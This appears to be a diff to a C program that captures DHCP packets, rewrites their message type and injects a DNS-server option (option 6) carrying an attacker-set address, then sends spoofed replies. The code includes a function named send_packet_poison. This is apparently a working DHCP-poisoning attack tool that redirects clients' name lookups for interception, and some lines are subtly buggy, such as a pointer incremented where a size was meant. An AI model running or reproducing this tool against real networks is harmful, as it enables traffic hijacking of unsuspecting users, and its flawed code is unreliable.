@@ -31,27 +31,47 @@ unsigned short checksum(unsigned short *ptr,int nbytes){
 }
 
 int packet_type(dhcp_header *dhcp, unsigned int size){
-	unsigned char *debut = dhcp->options;
-	while((void*) debut - (void*) dhcp < size && *debut != 53){
-		int tmp = *(debut + 1);
-		debut = debut + 3 + tmp;
+	int debut = 0;
+	while(debut < OPTION_SIZE && dhcp->options[debut] != 53){
+		debut += dhcp->options[debut+1] + 2;
 	}
-
-	if((void*) debut - (void*) dhcp < size && *debut == 53)
-		return *(debut+2);
+	
+	if(debut < OPTION_SIZE && dhcp->options[debut] == 53)
+		return dhcp->options[debut+2];
 	return -1;
 }
 
 void modify_packet_type(dhcp_header *dhcp, unsigned int size, int new_type){
-	unsigned char *debut = dhcp->options;
-	while((void*) debut - (void*) dhcp < size && *debut != 53){
-		int tmp = *(debut + 1);
-		debut = debut + 3 + tmp;
+	int debut = 0;
+	while(debut < OPTION_SIZE && dhcp->options[debut] != 53){
+		debut += dhcp->options[debut+1] + 2;
+	}
+	
+	if(debut < OPTION_SIZE && dhcp->options[debut] == 53)
+		dhcp->options[debut+2] = new_type;
+	return;
+}
+
+void add_dns_server(dhcp_header *dhcp, unsigned int *size){
+	int debut = 0;
+	while(debut < OPTION_SIZE && dhcp->options[debut] != 255){
+		debut += dhcp->options[debut+1] + 2;
 	}
 
-	if((void*) debut - (void*) dhcp < size && *debut == 53)
-		*(debut+2) = new_type;
-	return;
+	int a,b,c,d;
+	sscanf(DNS_SERVER, "%d.%d.%d.%d", &a, &b, &c, &d);
+
+	if(debut < OPTION_SIZE && dhcp->options[debut] == 255){
+		dhcp->options[debut] = 6;
+		if(debut + 6 < OPTION_SIZE)
+			size += 6;
+		dhcp->options[debut + 1] = 4;
+		dhcp->options[debut + 2] = (uint8_t) a;
+		dhcp->options[debut + 3] = (uint8_t) b;
+		dhcp->options[debut + 4] = (uint8_t) c;
+		dhcp->options[debut + 5] = (uint8_t) d;
+		dhcp->options[debut + 6] = 255;
+	}
 }
 
 void fill_offer(dhcp_header* offer_msg){
@@ -181,7 +201,7 @@ void send_packet_poison(int sockfd, dhcp_header* offer_msg){
 }
 
 
-void send_packet(int sockfd, dhcp_header* dhcp, unsigned int size, uint32_t new_ip){
+void send_packet(int sockfd, dhcp_header* dhcp, unsigned int size){
 
 	char packet[65536], *data;
 	memset(packet, 0, 65536);
@@ -213,10 +233,7 @@ void send_packet(int sockfd, dhcp_header* dhcp, unsigned int size, uint32_t new_
 	iph->ttl = 128;
 	iph->protocol = 17;
 	iph->saddr = inet_addr(MY_IP); //no htonl
-	if(new_ip != 0)
-		iph->daddr = new_ip; //no htonl
-	else
-		iph->daddr = dhcp->ciaddr;
+	iph->daddr = dhcp->ciaddr;
 	iph->check = htons(checksum((short unsigned int *) iph, size_iph));
 
 
@@ -250,16 +267,17 @@ void send_packet(int sockfd, dhcp_header* dhcp, unsigned int size, uint32_t new_
 		printf("Couldn't put NULL_ADDR into sockaddr_in\n");
 		return;
 	}
-
+	printf("send\n");
 	if(sendto(sockfd, packet, tot_size, 0, (struct sockaddr*) &addr, sizeof(struct sockaddr_in)) < 0){
 		printf("Error sending packet : %s\n", strerror(errno));
 		return;
 	}
+	printf("SENT\n");
 	
 	free(check_calc);
 }
 
-unsigned int fill_dhcp_packet(dhcp_header *dhcph, const u_char *Buffer, int Size){
+unsigned int fill_dhcp_packet(dhcp_header **dhcph, const u_char *Buffer, int Size){
     unsigned short iphdrlen;
 
     struct ethhdr *eth = (struct ethhdr *)Buffer;
@@ -269,9 +287,9 @@ unsigned int fill_dhcp_packet(dhcp_header *dhcph, const u_char *Buffer, int Size
 
     struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));
 	
-    int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;
+    int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof(udph);
 	
-	dhcph = (dhcp_header*)(Buffer + header_size);
+	*dhcph = (dhcp_header*)(Buffer + header_size);
 	
 	/*
     printf("\n\n***********************DHCP Packet*************************\n");
